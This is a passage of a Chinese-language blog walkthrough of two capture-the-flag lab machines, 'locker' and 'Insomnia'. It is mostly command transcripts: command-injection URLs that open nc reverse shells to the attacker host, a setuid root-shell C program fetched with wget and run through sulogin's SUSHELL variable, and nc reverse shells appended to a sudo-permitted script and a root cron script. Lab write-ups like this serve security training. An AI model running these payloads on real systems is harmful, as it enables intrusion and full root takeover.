<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.51</span>/locker.php?image=;nc%<span class="number">20192.168</span><span class="number">.56</span><span class="number">.50</span>%<span class="number">201234</span>%<span class="number">20</span>-e%<span class="number">20</span>%<span class="number">20</span>/<span class="built_in">bin</span>/bash;</span><br></pre></td></tr></table></figure>

<p>寻找提权路径</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@locker:~/html$ find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/sulogin</span><br><span class="line">/usr/<span class="built_in">bin</span>/umount</span><br><span class="line">/usr/<span class="built_in">bin</span>/gpasswd</span><br><span class="line">/usr/<span class="built_in">bin</span>/newgrp</span><br><span class="line">/usr/<span class="built_in">bin</span>/chfn</span><br><span class="line">/usr/<span class="built_in">bin</span>/chsh</span><br><span class="line">/usr/<span class="built_in">bin</span>/passwd</span><br><span class="line">/usr/<span class="built_in">bin</span>/mount</span><br><span class="line">/usr/<span class="built_in">bin</span>/su</span><br><span class="line">www-data@locker:~/html$ /usr/sbin/getcap -r / <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/sbin/getcap -r / <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">bin</span>/ping = cap_net_raw+ep</span><br></pre></td></tr></table></figure>

<p>有一个sulogin</p>
<p>查看手册发现sulogin -e会切换到root</p>
<p>但是我们实际执行却并没有成功，提示root用户被锁</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ENVIRONMENT</span><br><span class="line">       sulogin looks <span class="keyword">for</span> the environment variable SUSHELL <span class="keyword">or</span> sushell to</span><br><span class="line">       determine what shell to start. If the environment variable <span class="keyword">is</span> <span class="keyword">not</span></span><br><span class="line">       <span class="built_in">set</span>, it will <span class="keyword">try</span> to execute root’s shell <span class="keyword">from</span> /etc/passwd. If that</span><br><span class="line">       fails, it will fall back to /<span class="built_in">bin</span>/sh.</span><br><span class="line">环境</span><br><span class="line">sulogin 查找环境变量 SUSHELL 或 sushell 以</span><br><span class="line">确定要启动的 shell。如果环境变量不是</span><br><span class="line"><span class="built_in">set</span> 中，它将尝试从 /etc/passwd 执行 root 的 shell。如果那</span><br><span class="line">失败，它将回退到 /<span class="built_in">bin</span>/sh。</span><br></pre></td></tr></table></figure>

<p>我们查看环境变量发现是空的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@locker:~/html$ echo $SUSHELL</span><br><span class="line">echo $SUSHELL</span><br><span class="line"></span><br><span class="line">www-data@locker:~/html$ echo $sushell</span><br><span class="line">echo $sushell</span><br></pre></td></tr></table></figure>

<p>这里我们可以去写一个shell脚本并将其写入SUSHELL环境变量里面，利用sulogin的特性去执行提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gcc -static shell.c -o shell静态编译避免libc版本依赖</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;    </span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译后上传到靶机的tmp目录下，赋予可执行权限，然后将路径写入SUSHELL，之后我们在执行sulogin -e就会查找SUSHELL环境变量</p>
<p>成功提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">www-data@locker:/tmp$ wget http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.50</span>:<span class="number">8000</span>/shell</span><br><span class="line">wget http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.50</span>:<span class="number">8000</span>/shell</span><br><span class="line">--<span class="number">2025</span>-05-<span class="number">26</span> 06:<span class="number">43</span>:09--  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.50</span>:<span class="number">8000</span>/shell</span><br><span class="line">Connecting to <span class="number">192.168</span><span class="number">.56</span><span class="number">.50</span>:<span class="number">8000.</span>.. connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">754968</span> (737K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;shell&#x27;</span></span><br><span class="line"></span><br><span class="line">shell               <span class="number">100</span>%[===================&gt;] <span class="number">737.27</span>K  --.-KB/s    <span class="keyword">in</span> <span class="number">0.03</span>s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-05-<span class="number">26</span> 06:<span class="number">43</span>:09 (<span class="number">25.1</span> MB/s) - <span class="string">&#x27;shell&#x27;</span> saved [<span class="number">754968</span>/<span class="number">754968</span>]</span><br><span class="line"></span><br><span class="line">www-data@locker:/tmp$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">772</span></span><br><span class="line">drwxrwxrwt  <span class="number">8</span> root     root       <span class="number">4096</span> May <span class="number">26</span> 06:<span class="number">43</span> .</span><br><span class="line">drwxr-xr-x <span class="number">18</span> root     root       <span class="number">4096</span> Jan <span class="number">22</span>  <span class="number">2021</span> ..</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root     root       <span class="number">4096</span> May <span class="number">26</span> 05:<span class="number">10</span> .ICE-unix</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root     root       <span class="number">4096</span> May <span class="number">26</span> 05:<span class="number">10</span> .Test-unix</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root     root       <span class="number">4096</span> May <span class="number">26</span> 05:<span class="number">10</span> .X11-unix</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root     root       <span class="number">4096</span> May <span class="number">26</span> 05:<span class="number">10</span> .XIM-unix</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root     root       <span class="number">4096</span> May <span class="number">26</span> 05:<span class="number">10</span> .font-unix</span><br><span class="line">-rw-r--r--  <span class="number">1</span> www-data www-data <span class="number">754968</span> May <span class="number">26</span> 06:<span class="number">42</span> shell</span><br><span class="line">drwx------  <span class="number">3</span> root     root       <span class="number">4096</span> May <span class="number">26</span> 05:<span class="number">10</span> systemd-private-d8f518294ce94ec48cf3af339bf6e059-systemd-timesyncd.service-VF6OkN</span><br><span class="line">www-data@locker:/tmp$ chmod +x shell</span><br><span class="line">chmod +x shell</span><br><span class="line">www-data@locker:/tmp$ echo $SUSHELL</span><br><span class="line">echo $SUSHELL</span><br><span class="line">/tmp/shell</span><br><span class="line">www-data@locker:/tmp$ /usr/sbin/sulogin -e</span><br><span class="line">/usr/sbin/sulogin -e</span><br><span class="line">Press Enter <span class="keyword">for</span> maintenance</span><br><span class="line">(<span class="keyword">or</span> press Control-D to <span class="keyword">continue</span>): </span><br><span class="line"></span><br><span class="line">root@locker:~<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure>

<h2 id="Insomnia"><a href="#Insomnia" class="headerlink" title="Insomnia"></a>Insomnia</h2><p>扫描端口只开了一个8080,dirsearch扫目录</p>
<p>扫到一个administration.php</p>
<p>进行wfuzz得到参数是logfile</p>
<p>尝试反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.59</span>:<span class="number">8080</span>/administration.php?logfile=;nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">1234</span> -e /<span class="built_in">bin</span>/bash;</span><br></pre></td></tr></table></figure>

<p>www-data用户可以无密码指定julia执行start.sh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@insomnia:~/html$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on insomnia:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on insomnia:</span><br><span class="line">    (julia) NOPASSWD: /<span class="built_in">bin</span>/bash /var/www/html/start.sh</span><br></pre></td></tr></table></figure>

<p>这里我们发现start.sh所有用户都可读可写可执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@insomnia:~/html$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">60</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> www-data www-data  <span class="number">4096</span> May <span class="number">29</span> 09:<span class="number">55</span> .</span><br><span class="line">drwxr-xr-x <span class="number">3</span> root     root      <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data   <span class="number">426</span> Dec <span class="number">21</span>  <span class="number">2020</span> administration.php</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">1610</span> Dec <span class="number">20</span>  <span class="number">2020</span> chat.js</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data <span class="number">19679</span> May <span class="number">30</span> 03:<span class="number">24</span> chat.txt</span><br><span class="line">drwxr-xr-x <span class="number">2</span> www-data www-data  <span class="number">4096</span> Dec <span class="number">20</span>  <span class="number">2020</span> images</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">2899</span> Dec <span class="number">21</span>  <span class="number">2020</span> index.php</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">1684</span> Dec <span class="number">20</span>  <span class="number">2020</span> process.php</span><br><span class="line">-rwxrwxrwx <span class="number">1</span> root     root        <span class="number">38</span> May <span class="number">30</span> 03:<span class="number">16</span> start.sh</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">1363</span> Dec <span class="number">20</span>  <span class="number">2020</span> style.css</span><br></pre></td></tr></table></figure>

<p>写反弹shell指令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@insomnia:~/html$ cat start.sh</span><br><span class="line">cat start.sh</span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br><span class="line">nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">12345</span> -e /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>

<p>进入julia用户后利用定时任务提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">julia@insomnia:~$ cat /etc/crontab</span><br><span class="line">cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/<span class="built_in">bin</span>/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/<span class="built_in">bin</span>:/sbin:/<span class="built_in">bin</span>:/usr/sbin:/usr/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line"><span class="number">17</span> *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">*  *    * * *   root    /<span class="built_in">bin</span>/bash /var/cron/check.sh</span><br></pre></td></tr></table></figure>

<p>这里的check.sh也是全用户可读可写可执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">julia@insomnia:~$ cat /var/cron/check.sh</span><br><span class="line">cat /var/cron/check.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">status=$(systemctl <span class="keyword">is</span>-active insomnia.service)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$status&quot;</span> == <span class="string">&quot;active&quot;</span>  ]; then</span><br><span class="line">   echo <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   systemctl start  insomnia.service</span><br><span class="line">fi</span><br><span class="line">nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">1235</span> -e /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>

<p>监听等待即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ nc -lvnp <span class="number">1235</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">1235</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.56</span><span class="number">.59</span>] <span class="number">47920</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>


    </div>

    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>